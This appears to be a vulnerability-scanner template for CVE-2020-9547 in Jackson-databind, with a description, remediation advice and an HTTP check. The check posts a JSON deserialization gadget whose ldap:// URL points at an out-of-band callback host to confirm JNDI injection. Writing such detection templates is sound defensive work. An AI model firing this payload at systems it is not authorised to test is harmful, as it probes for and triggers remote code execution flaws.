id: CVE-2020-9547

info:
  name: FasterXML Jackson Databind <=2.9.10.3 - Remote Code Execution
  author: tomaquet18
  severity: critical
  description: |
    A vulnerability in Jackson-databind versions 2.0.0 through 2.9.10.3 allows Remote Code Execution via unsafe deserialization.
    Specifically, the class com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig from ibatis-sqlmap was not blacklisted,
    allowing attackers to perform JNDI injection if default typing is enabled. This leads to arbitrary code execution on the server.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-9547
    - https://github.com/fairyming/CVE-2020-9547
    - https://www.sangfor.com/blog/cybersecurity/fasterxml-jackson-databind-remote-code-execution-cve-2020-9547
  tags: cve,cve2020,jackson,jackson-databind,deserialization,ibatis,jta,jndi,rce,oast,json,java,unsafe-deserialization
  remediation: |
    Upgrade jackson-databind to version 2.9.10.4 or later.
    Avoid enabling enableDefaultTyping in ObjectMapper or restrict deserialization to trusted classes.
  metadata:
    verified: false

flow: http()

http:
  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      Content-Type: application/json

    body: |
      [
        "com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
        {
          "properties": {
            "UserTransaction": "ldap://{{interactsh-url}}"
          }
        }
      ]

    matchers:
      # Use internal matcher to avoid duplicate match events caused by multiple DNS lookups (e.g. A and AAAA queries).
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
        internal: true

    extractors:
      - type: dsl
        dsl:
          - "BaseURL"
